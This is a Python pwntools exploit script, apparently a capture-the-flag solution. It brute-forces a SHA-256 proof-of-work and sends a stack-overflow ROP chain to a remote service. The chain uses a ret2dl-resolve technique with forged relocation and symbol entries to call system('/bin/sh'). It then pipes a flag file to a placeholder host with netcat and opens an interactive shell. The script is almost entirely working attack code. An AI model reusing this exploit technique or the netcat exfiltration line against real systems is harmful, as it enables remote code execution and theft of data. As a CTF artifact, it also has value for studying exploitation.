#!/usr/bin/env python

from pwn import *
from hashlib import sha256
import itertools

context.log_level = "debug"

plt_addr = 0x80482f0
bss_addr = 0x804a020
read_plt = 0x8048300
read_got = 0x804a00c 

pppop_ret = 0x80484e9
pop_ebp_ret = 0x80484eb
leave_ret = 0x8048455

dynsym_addr = 0x80481cc 
dynstr_addr = 0x804822c
rel_plt_addr = 0x80482b0
dynamic_addr = 0x8049f14

# fake

base_addr = bss_addr+0x20
reloc_arg = base_addr-rel_plt_addr
dynsym_off = ((base_addr+0x8-dynsym_addr+0x4)/0x10) << 0x8| 0x7
system_off = base_addr+0x18+0x4-dynstr_addr
bin_sh_addr = base_addr+0x20+0x4

stack_addr = bss_addr+0x600

#p = remote("172.22.224.113", 6666)
p = remote("202.120.7.202", 6666)
#p = remote("localhost", 6666)

charset = string.letters+string.digits

keywords = [''.join(i) for i in itertools.product(charset, repeat = 4)]

def auth():
    chal = p.recv(0x10)

    for i in range(len(keywords)):
        sol = keywords[i]
        if (len(sol) == 4) and sha256(chal + sol).digest().startswith('\0\0\0'):
            log.info("Found Cookie!")
            return sol

sol = auth()

p.send(sol)

payload1 = p8(0)*0x28
payload1 += p32(stack_addr)
payload1 += p32(read_plt)
payload1 += p32(leave_ret)
payload1 += p32(0x0)
payload1 += p32(stack_addr)
payload1 += p32(0x2c)

payload2 = p32(0)
payload2 += p32(read_plt)
payload2 += p32(pppop_ret)
payload2 += p32(0x0)
payload2 += p32(base_addr)
payload2 += p32(0x2c)
payload2 += p32(plt_addr)    # jump to _dl_runtime_resolve
payload2 += p32(reloc_arg)   # reloc_arg
payload2 += p32(read_plt)
payload2 += p32(0)
payload2 += p32(bin_sh_addr)

payload3 = p32(read_got)
payload3 += p32(dynsym_off)
payload3 += p8(0)*0x4
payload3 += p32(system_off)
payload3 += p32(0)*0x2
payload3 += p32(0x12)
payload3 += "system\x00\x00"
payload3 += "/bin/sh\x00"

sleep(1)
payload = payload1+payload2+payload3
#payload += "ls >&1\ncat flag>&0\ncat 123>&0\nls >&2;ls 1>&2;ls >&2;ls 1>&2;ls 2>&2;ls 2>&1;ls 1>&1;ls >&1\necho '1'>&2\n"
#payload += "echo '1'>&2\necho '2' 1>&2\necho '123' >/dev/tty\n"
payload += "cat flag | nc receive_ip port\n"
payload += p8(0)*(0x100-len(payload))
p.send(payload)

p.interactive()
